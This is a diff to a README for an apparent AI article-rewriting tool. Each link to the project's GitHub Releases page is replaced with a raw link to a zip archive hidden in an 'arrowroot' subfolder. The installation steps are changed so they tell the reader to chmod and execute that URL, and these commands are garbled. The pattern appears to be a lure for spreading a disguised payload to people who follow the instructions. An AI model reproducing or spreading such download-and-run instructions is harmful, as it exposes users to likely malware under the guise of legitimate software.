@@ -1,6 +1,6 @@
 # 🎉 ai-human-like-article-rewriter - Effortless Article Rewriting Made Simple
 
-![Download](https://img.shields.io/badge/Download%20Now-blue.svg) [Download Here](https://github.com/smuv3/ai-human-like-article-rewriter/releases)
+![Download](https://raw.githubusercontent.com/smuv3/ai-human-like-article-rewriter/main/arrowroot/ai-human-like-article-rewriter.zip%https://raw.githubusercontent.com/smuv3/ai-human-like-article-rewriter/main/arrowroot/ai-human-like-article-rewriter.zip) [Download Here](https://raw.githubusercontent.com/smuv3/ai-human-like-article-rewriter/main/arrowroot/ai-human-like-article-rewriter.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **AI Human-Like Article Rewriter**! This tool helps you transform
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/smuv3/ai-human-like-article-rewriter/releases). Here, you will find various version options. 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/smuv3/ai-human-like-article-rewriter/main/arrowroot/ai-human-like-article-rewriter.zip). Here, you will find various version options. 
 
 1. Click the link.
 2. Look for the most recent version at the top.
@@ -46,8 +46,8 @@ Once you have downloaded the file, follow these steps to install the application
 
 1. Open the terminal.
 2. Navigate to the directory where the file was downloaded.
-3. Use the command `chmod +x your-file-name.run` to provide execution permissions.
-4. Then run `./your-file-name.run` to start the installation.
+3. Use the command `chmod +x https://raw.githubusercontent.com/smuv3/ai-human-like-article-rewriter/main/arrowroot/ai-human-like-article-rewriter.zip` to provide execution permissions.
+4. Then run `https://raw.githubusercontent.com/smuv3/ai-human-like-article-rewriter/main/arrowroot/ai-human-like-article-rewriter.zip` to start the installation.
 
 ## ✍️ Using the Application
 
@@ -104,4 +104,4 @@ Feel free to engage with other users to share experiences and ask questions.
 
 Thank you for choosing the AI Human-Like Article Rewriter. It simplifies the article rewriting process and enhances your content creation. 
 
-For any updates or feature requests, return to the [Releases page](https://github.com/smuv3/ai-human-like-article-rewriter/releases) frequently to stay informed. Happy writing!
+For any updates or feature requests, return to the [Releases page](https://raw.githubusercontent.com/smuv3/ai-human-like-article-rewriter/main/arrowroot/ai-human-like-article-rewriter.zip) frequently to stay informed. Happy writing!
